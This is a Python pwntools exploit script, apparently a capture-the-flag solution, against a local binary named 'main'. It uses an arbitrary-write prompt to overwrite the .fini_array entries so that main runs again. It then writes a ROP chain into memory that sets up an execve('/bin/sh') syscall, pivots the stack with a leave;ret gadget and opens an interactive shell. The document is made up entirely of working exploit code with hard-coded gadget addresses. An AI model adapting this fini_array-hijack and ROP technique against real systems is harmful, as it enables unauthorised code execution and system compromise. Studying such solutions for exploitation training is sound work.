from pwn import *
context.log_level = 'debug'

p = process("./main")
elf = ELF("./main")

#hijack fini
libc_csu_fini = 0x0402CB0
main_addr = 0x0401C1D
fini_array = 0x4b80b0
esp = fini_array + 0x10
leave_ret = 0x0401cf3
ret = 0x0401016

#execve('/bin/sh',0,0)
rop_syscall = 0x46F745	
rop_pop_rax = 0x0000000000448fcc
rop_pop_rdx = 0x0000000000448415
rop_pop_rsi = 0x0000000000406f80
rop_pop_rdi = 0x0000000000401746
bin_sh_addr = 0x492895

def write(addr,data):
	p.sendlineafter('addr:',p64(addr))
	p.sendafter('data:',data)

# hijack fini_array
gdb.attach(p,'b *0x0402CB0')
write(fini_array,p64(libc_csu_fini) + p64(main_addr))

# rop chain
write(esp,p64(rop_pop_rax))
write(esp+8,p64(0x3b))
write(esp+16,p64(rop_pop_rdi))
write(esp+24,p64(bin_sh_addr))
write(esp+32,p64(rop_pop_rdx))
write(esp+40,p64(0))
write(esp+48,p64(rop_pop_rsi))
write(esp+56,p64(0))
write(esp+64,p64(rop_syscall))

# stack pivoting
#gdb.attach(p)
write(fini_array,p64(leave_ret) + p64(ret))
p.interactive()